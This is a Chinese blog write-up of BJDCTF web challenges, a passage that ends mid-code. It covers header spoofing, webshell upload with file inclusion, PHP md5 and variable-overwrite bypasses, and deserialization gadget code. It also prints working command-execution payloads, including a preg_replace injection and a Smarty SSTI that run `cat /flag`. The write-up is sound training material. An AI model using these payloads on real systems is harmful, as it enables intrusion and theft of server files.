+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glyuan's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/writeups/2020/01/17/BJDCTF-Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asinose">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glyuan's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            BJDCTF Web Writeup
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-17T00:00:00+08:00">
+                2020-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/Writeups" itemprop="url" rel="index">
+                    <span itemprop="name">Writeups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <h1 id="hello_world">hello_world</h1>
+
+<h2 id="解题思路">解题思路</h2>
+
+<p>打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回<code class="highlighter-rouge">please make sure your id</code>，要求我检查id。</p>
+
+<p>然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：<code class="highlighter-rouge">id: guestZ3Vlc3Q=</code>，猜测可能需要发送类似的请求头，于是伪造admin发送。</p>
+
+<p>这次返回<code class="highlighter-rouge">请使用主机访问</code>，伪造一个XFF试试。又返回<code class="highlighter-rouge">you are not from https://google.com</code>，那就再伪造Referer，于是获得了flag。</p>
+
+<h2 id="备注">备注</h2>
+
+<p>作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。</p>
+
+<hr />
+
+<h1 id="easy_upload">easy_upload</h1>
+
+<h2 id="解题思路-1">解题思路</h2>
+
+<p>是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。</p>
+
+<p>上传木马，然后注意到url的内容：<code class="highlighter-rouge">index.php?action=upload.php</code>，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。</p>
+
+<h2 id="备注-1">备注</h2>
+
+<p>一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。</p>
+
+<hr />
+
+<h1 id="hidden-secrets">Hidden secrets</h1>
+
+<h2 id="解题思路-2">解题思路</h2>
+
+<p>打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：<code class="highlighter-rouge">password: d0970714757783e6cf17b26fb8e2298f</code>，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。</p>
+
+<p>不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。</p>
+
+<hr />
+
+<h1 id="easy_md5">easy_md5</h1>
+
+<h2 id="解题思路-3">解题思路</h2>
+
+<p>打开就一个输入框，抓包看看，有这样的响应头：<code class="highlighter-rouge">hint: select * from 'admin' where password=md5($pass,true)</code>，不多说了，提交ffifdyop。</p>
+
+<p>在新返回的页面源码中找到这样的内容：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7</pre></td><td class="code"><pre class="highlight"><code><span class="c">&lt;!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+	//wow,you can really dance
+--&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>md5+弱类型，或者提交数组，通过，又返回了一个源码：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9</pre></td><td class="code"><pre class="highlight"><code> <span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
+
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param1'</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param2'</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param1'</span><span class="p">])</span><span class="o">===</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param2'</span><span class="p">])){</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<span class="p">}</span> 
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>md5碰撞，或者再提交数组，获得flag。</p>
+
+<h2 id="备注-2">备注</h2>
+
+<p>这次记住了，用提交数组的方式绕过md5检验。</p>
+
+<hr />
+
+<h1 id="mark-loves-cat">Mark loves cat</h1>
+
+<h2 id="解题思路-4">解题思路</h2>
+
+<p>源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">include</span> <span class="s1">'flag.php'</span><span class="p">;</span>
+
+<span class="nv">$yds</span> <span class="o">=</span> <span class="s2">"dog"</span><span class="p">;</span>
+<span class="nv">$is</span> <span class="o">=</span> <span class="s2">"cat"</span><span class="p">;</span>
+<span class="nv">$handsome</span> <span class="o">=</span> <span class="s1">'yds'</span><span class="p">;</span>
+
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
+    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
+    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$x</span> <span class="o">&amp;&amp;</span> <span class="nv">$x</span> <span class="o">!==</span> <span class="s1">'flag'</span><span class="p">){</span>
+        <span class="k">exit</span><span class="p">(</span><span class="nv">$handsome</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">])){</span>
+    <span class="k">exit</span><span class="p">(</span><span class="nv">$yds</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'flag'</span>  <span class="o">||</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'flag'</span><span class="p">){</span>
+    <span class="k">exit</span><span class="p">(</span><span class="nv">$is</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+
+<span class="k">echo</span> <span class="s2">"the flag is: "</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：<code class="highlighter-rouge">flag=flag</code>。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：<code class="highlighter-rouge">temp=flag&amp;flag=temp</code>。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。</p>
+
+<p>后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：<code class="highlighter-rouge">temp=flag&amp;flag=temp&amp;_GET=foo</code>。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：<code class="highlighter-rouge">_POST[flag]=bar</code>。完事。</p>
+
+<hr />
+
+<h1 id="这序列化也太简单了吧">这序列化也太简单了吧</h1>
+
+<h2 id="解题思路-5">解题思路</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="c1">//flag in /flag
+</span><span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
+        <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span> <span class="o">=</span> <span class="s1">'woc'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
+        <span class="nb">print_r</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$exp</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">];</span>
+<span class="nv">$new</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$exp</span><span class="p">);</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。</p>
+
+<hr />
+
+<h1 id="zjctf就这">ZJCTF，就这？</h1>
+
+<h2 id="解题思路-6">解题思路</h2>
+
+<p>又直接给了源码：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"text"</span><span class="p">];</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">),</span><span class="s1">'a'</span><span class="p">)){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"嚯，有点意思"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">===</span><span class="s2">"I have a dream"</span><span class="p">)){</span>
+    <span class="k">echo</span> <span class="s2">"&lt;br&gt;&lt;h1&gt;"</span><span class="o">.</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/"</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Not now!"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>  <span class="c1">//next.php
+</span>    
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>用data协议传入”I have a dream”，然后php://filter获取next.php源码：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>这是一个grep_replace()命令执行漏洞，可以利用<code class="highlighter-rouge">\S*=${}</code>执行PHP函数，构造payload：<code class="highlighter-rouge">\S*=${getFlag()}&amp;cmd=system('cat /flag');</code>，获得flag。</p>
+
+<hr />
+
+<h1 id="the-mystery-of-ip">The Mystery of IP</h1>
+
+<h2 id="解题思路-7">解题思路</h2>
+
+<p>打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。</p>
+
+<p>感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。</p>
+
+<p>可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system(“cat /flag”)}{/if}，获得flag。</p>
+
+<hr />
+
+<h1 id="easy_serialize">easy_serialize</h1>
+
+<h2 id="解题思路-8">解题思路</h2>
+
+<p>有源码如下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58<br/>59<br/>60<br/>61<br/>62<br/>63</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type:text/html;charset=utf-8"</span><span class="p">);</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">Read</span> 
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_file</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$text</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
+        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">Show</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$class1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="o">=</span><span class="s1">'index.php'</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s1">' Welcome'</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>    
+<span class="p">}</span>
+ 
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__toString</span><span class="p">()</span>
+    <span class="p">{</span>   
+        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class1</span><span class="o">-&gt;</span><span class="na">get_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+    <span class="p">}</span>
+ 
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">'hacker'</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
+        <span class="p">}</span>
+ 
+    <span class="p">}</span>
+ 
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">Change</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"hacker"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+        <span class="nv">$function</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$key</span><span class="p">}();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sid'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$sid</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sid'</span><span class="p">];</span>
+    <span class="nv">$config</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'config'</span><span class="p">]);</span>
+    <span class="nv">$config</span><span class="o">-&gt;</span><span class="nv">$sid</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+    <span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">(</span><span class="s1">'index.php'</span><span class="p">);</span>
+    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">Read</span> <span class="p">{</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Show</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$class1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="na">var</span> <span class="o">=</span> <span class="s2">"flag.php"</span><span class="p">;</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="na">class1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Read</span><span class="p">();</span>
+
+<span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+<span class="nv">$b</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。</p>
+
+<hr />
+
+<h1 id="easy_search">easy_search</h1>
+
+<h2 id="解题思路-9">解题思路</h2>
+
+<p>没有思路，那就扫目录，有vim源码泄漏：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nb">ob_start</span><span class="p">();</span>
+	<span class="k">function</span> <span class="nf">get_hash</span><span class="p">(){</span>
+		<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="p">;</span>
+		<span class="nv">$random</span> <span class="o">=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)];</span><span class="c1">//Random 5 times
+</span>		<span class="nv">$content</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">()</span><span class="o">.</span><span class="nv">$random</span><span class="p">;</span>
+		<span class="k">return</span> <span class="nb">sha1</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span> 
+	<span class="p">}</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/html;charset=utf-8"</span><span class="p">);</span>
+	<span class="o">***</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">'6d0bc1'</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nv">$admin</span> <span class="o">==</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span><span class="p">;</span>
+            <span class="nv">$file_shtml</span> <span class="o">=</span> <span class="s2">"public/"</span><span class="o">.</span><span class="nx">get_hash</span><span class="p">()</span><span class="o">.</span><span class="s2">".shtml"</span><span class="p">;</span>
+            <span class="nv">$shtml</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file_shtml</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Unable to open file!"</span><span class="p">);</span>
+            <span class="nv">$text</span> <span class="o">=</span> <span class="s1">'
+            ***
+            ***
